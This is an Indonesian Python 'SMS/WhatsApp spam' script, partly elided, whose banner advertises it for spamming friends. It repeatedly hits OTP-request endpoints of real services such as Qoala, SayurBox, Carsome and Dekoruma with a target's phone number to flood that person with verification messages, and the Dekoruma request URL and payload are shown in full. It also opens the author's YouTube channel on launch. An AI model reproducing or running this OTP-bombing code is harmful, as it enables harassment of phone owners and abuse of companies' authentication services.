# Compile by mifxyz
# Youtube : MIIF GANZ
# Github  : https://github.com/zLUCCIFER-07
# Mau recode ya? Izin dulu Slur >_<
# Jangan di edit nanti error Slur!!
MIF = ('OOOOOOOOOOO', 'OOOOOOOOOOO', 'OOOOOOOOOOO', 'OOOOOOOOOOO', 'OOOOOOOOOOO',
...
os.system('clear')
time.sleep(3)
print ("\033[36;1mSubscribe yt ku ngab \033[37mMifxyz \033[36mok! :v")
os.system("xdg-open https://m.youtube.com/@miifganz3136/channels")
os.system('clear')
time.sleep(3)

mengetik(f"""

\033[31;1m███████╗██████╗  █████╗ ███╗   ███╗\033[36;1m ██╗    ██╗\033[33m███████╗
\033[31;1m██╔════╝██╔══██╗██╔══██╗████╗ ████║\033[36;1m ██║    ██║\033[33m██╔════╝
\033[31;1m███████╗██████╔╝███████║██╔████╔██║\033[36;1m ██║ █╗ ██║\033[33m███████╗
\033[37;1m╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║\033[36;1m ██║███╗██║\033[33m╚════██║
\033[37;1m███████║██║     ██║  ██║██║ ╚═╝ ██║\033[36;1m ╚███╔███╔╝\033[33m███████║
\033[37;1m╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝\033[36;1m  ╚══╝╚══╝ \033[33m╚══════╝

\033[33;1m╔════════════════════════════════════════════════╗
\033[33;1m║  \033[36;1m [•] Authour : Miif_ganz                     \033[33;1m ║
\033[33;1m║  \033[36;1m [•] gitHub  : https://github.com/Mifxyz     \033[33;1m ║
\033[33;1m║  \033[36;1m [•] Yotube  : Miif ganz                     \033[33;1m ║
\033[33;1m╚════════════════════════════════════════════════╝
      Pembuat asli script ini adalah Mifxyz
   Banyak yg nyolong kgk di tulis siapa yg buat
         kalian custem sesuka kalian
\033[36;1m╔═══════════════════════════════════════╗
\033[36;1m║   \033[33;1m COCOK BUAT SPAM TEMEN LAKNAT :v   \033[36;1m ║
\033[36;1m╚═══════════════════════════════════════╝
""")
...
data_dek = json.dumps({"phoneNumber":"+62"+nomer,"platform":"sms"})
...
for k in range(jumlah):
  ...
  if "success" in pos_qoala:
    print("\033[1;95m[∆] Spam WhatsApp Qoala dikirimkan",k)
  else:
    print("\033[1;95m[∆] Spam WhatsApp Qoala dikirimkan",k)
for k in range(jumlah):
  k += 1
  ...
  if "__typename" in pos_sayur:
    print("\033[1;95m[∆] Spam WhatsApp SayurBox dikirimkan",k)
  else:
    print("\033[1;95m[∆] Spam WhatsApp SayurBox dikirimkan",k)
for k in range(jumlah):
  k += 1
  ...
  if "Send successfully" in pos_carsome:
    print("\033[1;95m[∆] Spam WhatsApp Carsome dikirimkan",k)
  else:
    print("\033[1;95m[∆] Spam WhatsApp Carsome dikirimkan",k)
for k in range(jumlah):
  k += 1
  dek = requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers=headers_dek,data=data_dek).text
  if "mengirim" in dek:
    print("\033[1;95m[∆] Spam sms dekorama dikirimkan",k)
  else:
    print("\033[1;95m[∆] Spam sms dekorama dikirimkan",k)
